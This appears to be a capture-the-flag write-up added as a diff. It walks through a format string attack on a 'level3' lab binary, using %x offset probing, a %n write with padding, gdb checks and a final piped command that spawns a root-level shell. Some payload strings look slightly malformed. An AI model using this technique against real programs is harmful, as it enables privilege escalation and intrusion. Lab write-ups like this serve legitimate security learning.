@@ -1,0 +1,84 @@
+When we disas main of ./level3 we can see than there's a v() function called.
+
+When we disas the v() function we can see that a fgets is used and that the result
+is passed to printf a printf() without other parameters.
+
+Next in the program, we can see that there's a simple cmp to the
+variable 0x0x804988c with the value 0x40.
+If equal, then a fwrite and a system("/bin/sh") are called.
+If not, then the function returns.
+
+Unfortunately the value of this variable is 0x0.
+
+We can perfom a format string attack on the printf, to write on this variable,
+and make it contains 0x40.
+
+1 :
+We will use python to build our format string.
+The first goal is to detect where are we reading our own format string, by using %x.
+
+python :
+print "AAAA" + (".%x" * 7);
+
+Prints :
+AAAA.200.b7fd1ac0.b7ff37d0.41414141.2e78252e.252e7825.78252e78
+
+So we can see that we are reading our AAAA on the 4th %x.
+
+2 :
+Let's use the %n, which will write on the address of the next printf param,
+the number of char written until the %n.
+
+Python :
+print "AAAA" + (".%x * 4") + "%n"
+
+We know that the last %x is the AAAA.
+So let's remove the last %x in order to make read %n our AAAA.
+And let's replace AAAA to the address we want to write.
+
+We can remove the "." and replace it by 8, in order to assume that each %x write
+8 chars.
+
+Python :
+print "\x08\x04\x98\x8c"[::-1] + ("%8x * 3") + "%n"
+
+3 :
+Now we can put a break on the cmp instruction and see what value has been written.
+gdb ./level3
+b *0x080484df
+run < <(python /tmp/format.py)
+i f eax
+
+Prints :
+eax 0x1c 28
+
+So 28 char have been written.
+
+4 :
+Now we must make printf write a bit more to reach 64 char written.
+For this we will add a "%Nx" where N is our padding.
+We will add the %Nx just before the %n so we must again remove a %x.
+And if we remove a %x so 8 chars are less written.
+64 - 28 = 36
+
+(36 + 8 chars to write = 44)
+
+Python :
+print "\x08\x04\x98\x8c"[::-1] + ("%8x * 2") + "%44x" + "%n"
+
+Prints :
+Wait what?!
+
+We succeed.
+
+Out of GDB :
+(python /tmp/format.py; cat -) | ./level3
+
+Now our bash is started.
+
+
+
+
+
+
+
